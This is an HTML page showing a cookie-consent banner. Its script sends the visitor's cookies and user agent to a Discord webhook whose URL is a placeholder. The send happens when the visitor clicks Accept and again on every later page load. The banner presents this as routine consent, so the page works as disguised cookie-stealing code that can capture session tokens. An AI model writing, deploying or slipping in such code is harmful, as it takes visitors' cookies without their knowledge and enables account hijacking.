<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Consent with Webhook</title>
    <style>
        body {
            background: #222;
            color: white;
            font-family: sans-serif;
        }
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #575454;
            color: #fff;
            padding: 20px;
            text-align: center;
            display: none;
            z-index: 999;
        }
        #cookie-banner button {
            padding: 10px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="cookie-banner">
        üç™ This site uses cookies to improve your experience. <br>
        <button onclick="acceptCookies()">Accept</button>
    </div>

    <script>
        const webhookUrl = "YOUR_WEBHOOK_URL"; // Replace with your Discord webhook URL

        // Check if the user has already consented to cookies
        function hasAcceptedCookies() {
            return document.cookie.includes("cookieConsent=true");
        }

        // Send user cookies to the webhook after consent
        function sendCookiesToWebhook() {
            const allCookies = document.cookie;  // Collect cookies
            const userAgent = navigator.userAgent;  // Get user agent (browser/device info)
            
            const payload = {
                content: `üåê User consented!\nüç™ Cookies: ${allCookies}\nüíª Device: ${userAgent}`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error("Failed to send cookies:", err));
        }

        // Accept cookies and store consent
        function acceptCookies() {
            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365; // Store consent for 1 year
            document.getElementById("cookie-banner").style.display = "none";
            sendCookiesToWebhook(); // Send cookies after consent
        }

        // Check if the user has already consented
        window.onload = function () {
            if (hasAcceptedCookies()) {
                sendCookiesToWebhook();  // Send cookies if already accepted
            } else {
                document.getElementById("cookie-banner").style.display = "block";  // Show consent banner if not accepted
            }
        };
    </script>

</body>
</html>
